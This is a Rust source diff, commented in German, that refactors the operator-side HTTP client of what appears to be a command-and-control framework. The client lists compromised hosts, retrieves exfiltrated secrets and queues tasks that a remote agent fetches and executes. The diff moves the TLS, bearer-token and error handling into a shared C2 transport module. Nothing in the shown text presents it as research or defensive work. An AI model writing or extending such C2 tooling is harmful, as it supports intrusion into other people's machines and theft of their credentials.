@@ -1,83 +1,61 @@
 //! HTTP-Client für die kx-server-API mit TLS und Bearer-Auth.
 //!
 //! Die Nachrichtentypen stammen aus `kx_core::c2` — der Client liest genau die
-//! Struktur, die der Server liefert.
+//! Struktur, die der Server liefert. Der Transport des Protokolls (TLS-Aufbau,
+//! Bearer-Header, URL-Bildung, Status→Fehler) liegt in
+//! `kx_core::c2::transport`; dieses Modul ist ein dünner Adapter darüber.
 
 use std::io::Write;
 use std::path::Path;
 
+use kx_core::c2::transport::{Transport, TransportError};
 use kx_core::c2::{
     CreateTaskRequest, ExfiltratedSecret, Host, Task, PATH_HOSTS, PATH_SECRETS, PATH_TASKS,
     PATH_TASKS_CREATE,
 };
-use serde::Deserialize;
 use thiserror::Error;
-use ureq::Agent;
 
 /// Fehler bei API-Requests.
+///
+/// Die Transportfehler kommen aus `kx_core::c2::transport` — dort steht die
+/// einzige Fehlertaxonomie des C2-Protokolls. Was hier bleibt, ist der Fehler
+/// der Bedienung: das Schreiben der Exportdatei.
 #[derive(Debug, Error)]
 pub enum ApiError {
-    /// TLS-Setup fehlgeschlagen.
-    #[error("TLS-Setup fehlgeschlagen: {0}")]
-    Tls(String),
-    /// HTTP-Request fehlgeschlagen.
-    #[error("HTTP-Request fehlgeschlagen: {0}")]
-    Http(String),
-    /// Antwort-JSON ungültig.
-    #[error("Antwort-JSON ungültig: {0}")]
-    Json(String),
+    /// Fehler aus dem C2-Transport.
+    #[error(transparent)]
+    Transport(#[from] TransportError),
     /// Datei-I/O-Fehler.
     #[error("Datei-I/O-Fehler: {0}")]
     Io(String),
 }
 
-/// API-Client mit ureq-Agent und Auth-Token.
+/// API-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
 pub struct Client {
-    agent: Agent,
-    base_url: String,
-    token: String,
+    transport: Transport,
 }
 
 impl Client {
     /// Erzeugt einen Client für den angegebenen Server.
     pub fn new(server: &str, token: &str, cert: &str) -> Result<Self, ApiError> {
-        let cert_pem = std::fs::read(cert)
-            .map_err(|e| ApiError::Tls(format!("Zertifikat nicht lesbar: {e}")))?;
-        let client_config =
-            kx_tls::client_config_trusting(&cert_pem).map_err(|e| ApiError::Tls(e.to_string()))?;
-        let agent = ureq::AgentBuilder::new().tls_config(client_config).build();
         Ok(Self {
-            agent,
-            base_url: server.trim_end_matches('/').to_string(),
-            token: token.to_string(),
+            transport: Transport::from_cert_file(server, token, cert)?,
         })
     }
 
     /// Liefert alle Hosts.
     pub async fn hosts(&self) -> Result<Vec<Host>, ApiError> {
-        get_json(
-            &self.agent,
-            &format!("{}{PATH_HOSTS}", self.base_url),
-            &self.token,
-        )
+        Ok(self.transport.get_json(PATH_HOSTS)?)
     }
 
     /// Liefert alle exfiltrierten Secrets.
     pub async fn secrets(&self) -> Result<Vec<ExfiltratedSecret>, ApiError> {
-        get_json(
-            &self.agent,
-            &format!("{}{PATH_SECRETS}", self.base_url),
-            &self.token,
-        )
+        Ok(self.transport.get_json(PATH_SECRETS)?)
     }
 
     /// Liefert alle Tasks.
     pub async fn tasks(&self) -> Result<Vec<Task>, ApiError> {
-        get_json(
-            &self.agent,
-            &format!("{}{PATH_TASKS}", self.base_url),
-            &self.token,
-        )
+        Ok(self.transport.get_json(PATH_TASKS)?)
     }
 
     /// Legt einen Task an und liefert die ID zurueck.
@@ -85,40 +63,9 @@ impl Client {
     /// Der Agent holt den Task ueber `GET /api/tasks` ab, fuehrt ihn aus und
     /// meldet das Ergebnis zurueck.
     pub async fn create_task(&self, req: &CreateTaskRequest) -> Result<String, ApiError> {
-        let resp = self
-            .agent
-            .post(&format!("{}{PATH_TASKS_CREATE}", self.base_url))
-            .set("Authorization", &format!("Bearer {}", self.token))
-            .send_json(serde_json::to_value(req).map_err(|e| ApiError::Json(e.to_string()))?)
-            .map_err(|e| ApiError::Http(e.to_string()))?;
-        if resp.status() != 200 && resp.status() != 201 {
-            let status = resp.status();
-            let body = resp.into_string().unwrap_or_else(|_| "<binaer>".into());
-            return Err(ApiError::Http(format!("Status {status}: {body}")));
-        }
-        let body = resp
-            .into_string()
-            .map_err(|e| ApiError::Http(e.to_string()))?;
-        let task: Task = serde_json::from_str(&body).map_err(|e| ApiError::Json(e.to_string()))?;
+        let task: Task = self.transport.post_json_response(PATH_TASKS_CREATE, req)?;
         Ok(task.id)
     }
-}
-
-/// Führt einen GET-Request durch und parst die JSON-Antwort.
-fn get_json<T: for<'de> Deserialize<'de>>(
-    agent: &Agent,
-    url: &str,
-    token: &str,
-) -> Result<T, ApiError> {
-    let resp = agent
-        .get(url)
-        .set("Authorization", &format!("Bearer {token}"))
-        .call()
-        .map_err(|e| ApiError::Http(e.to_string()))?;
-    let body = resp
-        .into_string()
-        .map_err(|e| ApiError::Http(e.to_string()))?;
-    serde_json::from_str(&body).map_err(|e| ApiError::Json(e.to_string()))
 }
 
 /// Exportiert Secrets als JSON oder CSV.
